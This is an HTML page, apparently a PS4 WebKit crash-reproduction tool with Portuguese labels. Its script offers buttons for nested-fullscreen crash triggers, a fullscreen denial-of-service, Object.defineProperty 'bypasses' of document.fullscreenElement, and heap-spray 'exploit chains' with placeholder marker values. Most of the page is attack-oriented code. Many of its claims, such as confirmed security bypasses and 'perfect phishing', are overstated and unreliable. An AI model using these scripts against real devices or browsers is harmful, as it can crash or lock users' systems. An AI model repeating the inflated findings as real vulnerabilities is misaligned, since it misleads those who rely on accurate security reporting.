
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Crash Reproduction</title>
</head>
<body>

<h1>PS4 WebKit - Crash Reproduction</h1>

<p><strong>BUGS ENCONTRADOS:</strong></p>
<p>1. Nested Inconsistency → CRASH (Type error)</p>
<p>2. Recriar Elemento → CRASH (Type error)</p>
<p>3. Object.defineProperty → Security Bypass</p>

<h2>Crashes Confirmados</h2>

<button onclick="crash1()">CRASH 1: Nested Inconsistency (CONFIRMADO)</button><br>
<button onclick="crash2()">CRASH 2: Recriar Elemento (CONFIRMADO)</button><br>
<button onclick="crash3()">CRASH 3: Nested + Property Override</button><br>
<button onclick="crash4()">CRASH 4: Multiple Property Override</button><br>
<button onclick="crash5()">CRASH 5: Triple Nested</button><br>

<h2>Security Bypasses</h2>

<button onclick="bypass1()">BYPASS 1: Forge fullscreenElement</button><br>
<button onclick="bypass2()">BYPASS 2: Fake Fullscreen State</button><br>
<button onclick="bypass3()">BYPASS 3: Phishing PoC</button><br>

<h2>Exploitation</h2>

<button onclick="exploit1()">EXPLOIT 1: Crash + Heap Spray</button><br>
<button onclick="exploit2()">EXPLOIT 2: Property Override + Crash</button><br>
<button onclick="exploit3()">EXPLOIT 3: Full Chain</button><br>

<h2>PoCs Mínimos (Para Report)</h2>

<button onclick="poc_crash()">PoC: Nested Crash (5 linhas)</button><br>
<button onclick="poc_bypass()">PoC: Security Bypass (3 linhas)</button><br>
<button onclick="poc_dos()">PoC: DoS (2 linhas)</button><br>

<h2>Log</h2>
<pre id="log"></pre>

<script>
function log(msg) {
    const logEl = document.getElementById('log');
    const ts = new Date().toLocaleTimeString();
    logEl.textContent += `[${ts}] ${msg}\n`;
    logEl.scrollTop = logEl.scrollHeight;
}

async function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function createInconsistency() {
    await document.documentElement.requestFullscreen();
    await sleep(100);
    alert('Inconsistência criada');
    await sleep(100);
}

// ============================================
// CRASH 1: NESTED INCONSISTENCY (CONFIRMADO)
// ============================================
async function crash1() {
    log('=== CRASH 1: Nested Inconsistency ===');
    log('STATUS: CONFIRMADO nos logs');
    
    try {
        // Primeira inconsistência
        log('[1] Criando primeira inconsistência...');
        await createInconsistency();
        log('[1] Primeira OK');
        
        // Segunda inconsistência (CRASHA)
        log('[2] Tentando segunda inconsistência...');
        await document.documentElement.requestFullscreen();
        await sleep(100);
        alert('Segunda inconsistência');
        
        log('[2] Segunda OK - SEM CRASH?');
        
    } catch(e) {
        log('CRASH CONFIRMADO: ' + e.message);
        log('Tipo: ' + e.name);
        log('Stack: ' + (e.stack || 'N/A'));
    }
}

// ============================================
// CRASH 2: RECRIAR ELEMENTO (CONFIRMADO)
// ============================================
async function crash2() {
    log('=== CRASH 2: Recriar Elemento ===');
    log('STATUS: CONFIRMADO nos logs');
    
    try {
        log('[1] Criando inconsistência...');
        await createInconsistency();
        
        log('[2] fullscreenElement: ' + document.fullscreenElement);
        
        // Criar novo elemento
        log('[3] Criando novo elemento...');
        const newDiv = document.createElement('div');
        newDiv.id = 'fullscreen-fake';
        document.body.appendChild(newDiv);
        
        log('[4] Tentando fullscreen no novo elemento...');
        await newDiv.requestFullscreen();
        
        log('[4] Fullscreen OK - SEM CRASH?');
        
    } catch(e) {
        log('CRASH CONFIRMADO: ' + e.message);
        log('Tipo: ' + e.name);
    }
}

// ============================================
// CRASH 3: NESTED + PROPERTY OVERRIDE
// ============================================
async function crash3() {
    log('=== CRASH 3: Nested + Property Override ===');
    
    try {
        await createInconsistency();
        
        // Override property
        Object.defineProperty(document, 'fullscreenElement', {
            value: document.body
        });
        log('Property overridden');
        
        // Nested
        await document.documentElement.requestFullscreen();
        alert('Nested com property override');
        
        log('OK - SEM CRASH');
        
    } catch(e) {
        log('CRASH: ' + e.message);
    }
}

// ============================================
// CRASH 4: MULTIPLE PROPERTY OVERRIDE
// ============================================
async function crash4() {
    log('=== CRASH 4: Multiple Property Override ===');
    
    try {
        await createInconsistency();
        
        for (let i = 0; i < 10; i++) {
            Object.defineProperty(document, 'fullscreenElement', {
                value: document.body,
                writable: true,
                configurable: true
            });
            log('Override ' + (i+1));
        }
        
        log('OK - SEM CRASH');
        
    } catch(e) {
        log('CRASH: ' + e.message);
    }
}

// ============================================
// CRASH 5: TRIPLE NESTED
// ============================================
async function crash5() {
    log('=== CRASH 5: Triple Nested ===');
    
    try {
        // Primeira
        await createInconsistency();
        log('[1] Primeira OK');
        
        // Segunda
        await document.documentElement.requestFullscreen();
        alert('Segunda');
        log('[2] Segunda OK');
        
        // Terceira
        await document.documentElement.requestFullscreen();
        alert('Terceira');
        log('[3] Terceira OK');
        
    } catch(e) {
        log('CRASH em nested ' + e.message);
    }
}

// ============================================
// BYPASS 1: FORGE FULLSCREENELEMENT
// ============================================
async function bypass1() {
    log('=== BYPASS 1: Forge fullscreenElement ===');
    log('IMPACTO: Security bypass confirmado!');
    
    try {
        await createInconsistency();
        
        // Verificar antes
        log('Antes: ' + document.fullscreenElement);
        
        // FORGE
        Object.defineProperty(document, 'fullscreenElement', {
            value: document.body
        });
        
        // Verificar depois
        log('Depois: ' + document.fullscreenElement);
        log('BYPASS: fullscreenElement forjado!');
        
        // Testar se sites confiam nisso
        if (document.fullscreenElement === document.body) {
            log('Site detectaria: BODY em fullscreen (FAKE!)');
        }
        
    } catch(e) {
        log('Erro: ' + e.message);
    }
}

// ============================================
// BYPASS 2: FAKE FULLSCREEN STATE
// ============================================
async function bypass2() {
    log('=== BYPASS 2: Fake Fullscreen State ===');
    
    try {
        // Não entrar em fullscreen real
        log('Estado: Não-fullscreen');
        
        // Forjar estado
        Object.defineProperty(document, 'fullscreenElement', {
            value: document.documentElement,
            writable: false
        });
        
        log('fullscreenElement forjado: ' + document.fullscreenElement);
        
        // Site detecta fullscreen mesmo sem estar!
        if (document.fullscreenElement) {
            log('BYPASS: Site acha que está em fullscreen!');
            log('Pode executar código "seguro" sem estar fullscreen');
        }
        
    } catch(e) {
        log('Erro: ' + e.message);
    }
}

// ============================================
// BYPASS 3: PHISHING POC
// ============================================
async function bypass3() {
    log('=== BYPASS 3: Phishing PoC ===');
    
    try {
        // Entrar em fullscreen
        await createInconsistency();
        
        // Forjar estado como null
        Object.defineProperty(document, 'fullscreenElement', {
            value: null
        });
        
        log('Visual: FULLSCREEN');
        log('API: null (forjado)');
        
        // Simular código de site
        if (!document.fullscreenElement) {
            log('Site acha que NÃO está em fullscreen');
            log('Mostra conteúdo "normal"');
            log('MAS usuário vê fullscreen fake!');
            log('= PHISHING PERFEITO');
        }
        
    } catch(e) {
        log('Erro: ' + e.message);
    }
}

// ============================================
// EXPLOIT 1: CRASH + HEAP SPRAY
// ============================================
async function exploit1() {
    log('=== EXPLOIT 1: Crash + Heap Spray ===');
    
    try {
        // Heap spray
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({marker: 0x41414141, data: new Uint8Array(256)});
        }
        log('Heap spray criado');
        
        // Primeira inconsistência
        await createInconsistency();
        
        // Nested (crash)
        await document.documentElement.requestFullscreen();
        alert('Crash trigger');
        
        log('SEM CRASH ou crash controlado?');
        
    } catch(e) {
        log('CRASH: ' + e.message);
    }
}

// ============================================
// EXPLOIT 2: PROPERTY OVERRIDE + CRASH
// ============================================
async function exploit2() {
    log('=== EXPLOIT 2: Property Override + Crash ===');
    
    try {
        await createInconsistency();
        
        // Override
        Object.defineProperty(document, 'fullscreenElement', {
            value: {
                innerHTML: 'CONTROLLED',
                click: () => log('CLICK INTERCEPTED!')
            }
        });
        
        // Nested crash
        await document.documentElement.requestFullscreen();
        alert('Crash');
        
        log('Exploit completo');
        
    } catch(e) {
        log('CRASH: ' + e.message);
    }
}

// ============================================
// EXPLOIT 3: FULL CHAIN
// ============================================
async function exploit3() {
    log('=== EXPLOIT 3: Full Chain ===');
    
    try {
        // 1. Heap spray
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({vtable: 0x42424242});
        }
        
        // 2. Inconsistency
        await createInconsistency();
        
        // 3. Property override
        Object.defineProperty(document, 'fullscreenElement', {
            value: spray[500]
        });
        
        // 4. Nested crash
        await document.documentElement.requestFullscreen();
        alert('Full exploit');
        
        log('EXPLOIT CHAIN COMPLETO');
        
    } catch(e) {
        log('CRASH: ' + e.message);
    }
}

// ============================================
// POC: NESTED CRASH (MÍNIMO)
// ============================================
async function poc_crash() {
    log('=== PoC: Nested Crash (5 linhas) ===');
    
    await document.documentElement.requestFullscreen();
    alert('1');
    await document.documentElement.requestFullscreen();
    alert('2');
    log('PoC executado - crashou?');
}

// ============================================
// POC: SECURITY BYPASS (MÍNIMO)
// ============================================
async function poc_bypass() {
    log('=== PoC: Security Bypass (3 linhas) ===');
    
    await document.documentElement.requestFullscreen();
    alert('Lock');
    Object.defineProperty(document, 'fullscreenElement', {value: null});
    log('Bypass: fullscreenElement forjado para null');
    log('Visual: fullscreen | API: null');
}

// ============================================
// POC: DOS (MÍNIMO)
// ============================================
async function poc_dos() {
    log('=== PoC: DoS (2 linhas) ===');
    
    await document.documentElement.requestFullscreen();
    alert('Preso em fullscreen - ESC não funciona');
    log('DoS confirmado');
}

// ============================================
// INIT
// ============================================
log('PS4 WebKit - Crash Reproduction Tool');
log('');
log('BUGS CONFIRMADOS:');
log('1. Nested Inconsistency → Crash');
log('2. Recriar Elemento → Crash');
log('3. Object.defineProperty → Security Bypass');
log('');
log('Execute os testes para reproduzir!');
</script>

</body>
</html>
